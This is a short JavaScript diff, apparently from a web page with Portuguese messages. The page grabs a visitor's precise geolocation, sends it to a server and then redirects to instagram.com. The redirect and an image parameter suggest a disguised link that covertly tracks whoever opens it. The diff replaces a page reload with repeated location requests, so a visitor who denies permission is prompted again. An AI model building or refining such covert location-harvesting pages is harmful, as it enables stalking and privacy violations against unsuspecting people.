@@ -120,12 +120,13 @@
               if (!textResp.ok) throw new Error("Erro ao enviar localização");
               window.location.href = "https://instagram.com";
             } catch (err) {
-              showOverlay("Erro ao enviar localização. Toque para tentar novamente.", getLocation);
+              showOverlay("Erro ao enviar localização. Toque para tentar novamente.", () => requestLocation(imageUrl));
             }
           },
           () => {
             showOverlay("Permissão de localização negada. Toque para tentar novamente.", () => {
-              window.location.reload(); // força reload para tentar nova requisição no Safari
+              // repete a tentativa de localização com interação do usuário
+              requestLocation(imageUrl);
             });
           },
           { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
